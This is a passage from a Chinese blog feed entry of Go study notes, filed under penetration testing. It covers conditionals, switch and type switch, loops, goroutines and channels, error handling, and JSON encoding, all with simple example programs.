class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> x <span class="type">int</span></span><br><span class="line">fmt.Println(<span class="string">&quot;请输入x&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;x)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;x is equals 1&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;x is not equals 1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当使用switch结构的时候，Go语言必须使用花括号,与其他现代编程语言不同的是，go不需要包含<code>break</code>语句。在其他语言中当 case不包含<code>break</code>的时候，将持续执行，在<code>go</code>中只会执行一种语句</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"> <span class="keyword">var</span> x = <span class="string">&quot;foo&quot;</span></span><br><span class="line"><span class="keyword">switch</span> x &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;foo&quot;</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;fonud foo&quot;</span>);</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;bar&quot;</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;fonud bar&quot;</span>);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;default&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Go有一个 <code>type switch</code>的特殊变体，通过<code>switch</code>语句进行类型断言，对判断类型接口很有用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span>  &#123;</span><br><span class="line"><span class="keyword">switch</span> i.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;int&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;string&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;unknown error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">foo(<span class="type">int</span>(<span class="number">64</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>本示例中使用特殊语法(i.type)检查 i 变量的类型，然后进行匹配</p></blockquote><p>最后一个流程控制是<code>for</code>循环，for循环是 Go用于执行重复代码的结构，Go没有诸如<code>do</code>或者<code>while</code>之类的约定</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++ &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是 for循环的一个轻量级变体，用于遍历集合或者切片&#x2F;映射</p><blockquote><p>和python 一样，idx用于索引</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">nums :=[]<span class="type">int</span>&#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>&#125;</span><br><span class="line"><span class="keyword">for</span> idx,val := <span class="keyword">range</span> nums&#123;</span><br><span class="line">fmt.Println(idx+<span class="number">1</span>,val)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-并发"><a href="#3-并发" class="headerlink" title="3. 并发"></a>3. 并发</h4><p>go拥有比其他语言更为简单的并发模型，可以使用<code>gorountine</code>并发执行代码，因其是可以同时运行的函数或者方法，<code>gorountine</code>被称为轻量级线程，于实际线程相比，创建他们的成本极低</p><p>可以通过在被调用的方法或者函数之前使用<code>go</code>关键字创建<code>gorountine</code>实现并发</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;f function&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> f()</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">fmt.Println(<span class="string">&quot;main function&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219124257.png"></p><p>在函数之前使用了<code>go</code>关键字，这将意味着程序同时运行f()和main()，换句话说：main()函数的执行将继续，而无需等待f()完成。当我们使用<code>time.Sleep</code>强制main函数暂停，以便f()可以执行完，如果不暂停main()函数，则该线程很可能在f()执行完毕之前就退出，将看不到其结果。</p><p>go 具有一种称为<code>通道</code>（channel）的数据类型，该数据类型提供了一个机制，通过该机制，<code>gorountine</code>可以同步执行函数并且这些函数可以互相通信。下面的例子显示使用一个通道时显示不用字符串的长度及其总和的示例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strlen</span><span class="params">(s <span class="type">string</span>, c <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">c &lt;- <span class="built_in">len</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">go</span> strlen(<span class="string">&quot;Salutations&quot;</span>,c)</span><br><span class="line"><span class="keyword">go</span> strlen(<span class="string">&quot;wolrd&quot;</span>,c)</span><br><span class="line">x,y := &lt;-c,&lt;-c</span><br><span class="line">fmt.Println(x,y,x+y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，定义并使用<code> chan int</code>类型的变量 c，你可以定义各种类型的通道，具体取决于通道传递的数据类型，你可以在<code>gorountine中</code>定义各种类型的通道，具体取决于要在通道传递的数据类型，上面的类型是要传递<code>int</code>类型的数据传长度。因此使用<code>int</code>类型的传递参数</p><p>请注意一个新的运算符，<code>&lt;-</code>。该运算符只是数据时流入还是流出通道，你可以这样理解他，”将物品放在桶里或者取出一个物品”</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219130532.png"></p><p>结果是<code>5,6,11</code>，可以理解为是一个栈，将最先放进去放到最底部，取出最后放入的，所以才会出现这种情况。</p><p>同时，从通道中取出数据则表明要取出足够的数据，否则会阻塞在这一行</p><h4 id="4-错误处理"><a href="#4-错误处理" class="headerlink" title="4. 错误处理"></a>4. 错误处理</h4><p>与大多数现代编程语言不同，Go 没有<code>try/catch/finally</code>错误的处理语法。但是，它使用了一种更为简单的方法，鼓励你多去检查哪些容易出现错误的地方，这样他们就不会聚焦在调用链中。</p><p>Go使用以下接口声明定义内置错误的类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着可以实现了方法Error()的任何数据类型，该方法返回字符串作为一个错误，例如，可以在代码中自定义错误</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;errors&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> myError <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e myError)</span></span>Error() <span class="type">string</span>  &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(e)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span></span> <span class="type">error</span>  &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;some Error Occurred&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">if</span> err := foo(); err !=<span class="literal">nil</span>&#123;</span><br><span class="line"><span class="comment">//处理错误的回显</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你会发现函数和方法至少返回一个值是很普遍的，并且这些值中总会又一个返回值是错误的，在Go中如果返回错误值是<code>nil</code>,则表明函数未出现任何问题。</p><blockquote><p>go 语言中没有形成统一的错误记录方法，原因之一是，与其他语言不同，Go的内置错误类型没有隐式包含堆栈跟踪以帮助查明错误的上下文或者位置，</p></blockquote><h4 id="5-处理结构化数据"><a href="#5-处理结构化数据" class="headerlink" title="5. 处理结构化数据"></a>5. 处理结构化数据</h4><p>安全从业人员会预先编好处理结构挂数据或者具有通用编码的数据，如<code>JSON</code>,<code>xml</code></p><p>最常见的两个包是<code>encoding/xml</code>和<code>encoding.json</code>，这两个包都可以组编和结组任意数据结构，这意味着他们可以将字符串转化为结构体，也可以将结构体序列化为字节切片，然后将字节切片反序列化为结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Foo02 <span class="keyword">struct</span> &#123;</span><br><span class="line">Bar <span class="type">string</span></span><br><span class="line">Baz <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f := Foo02&#123;<span class="string">&quot;h0ld1rs&quot;</span>,<span class="string">&quot;hello world&quot;</span>&#125;</span><br><span class="line">b,_ := json.Marshal(f)</span><br><span class="line">fmt.Println(<span class="type">string</span>(b))</span><br><span class="line">err := json.Unmarshal(b, &amp;f)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>json.Marshal 将struct 编码为<code>JSON</code>，返回一个字节切片，随后将其打印到标准输出，显示的是Json形式的字节码形式</p><p>json.Unmarshal(b,&amp;f)  将其进行解码，生成一个foo结构体实例。处理xml与此过程大致相同</p><p><a href="https://www.jianshu.com/p/da486be83e8a">https://www.jianshu.com/p/da486be83e8a</a></p>]]></content>
    
    
    <summary type="html">正在学习golang语言的一些笔记</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
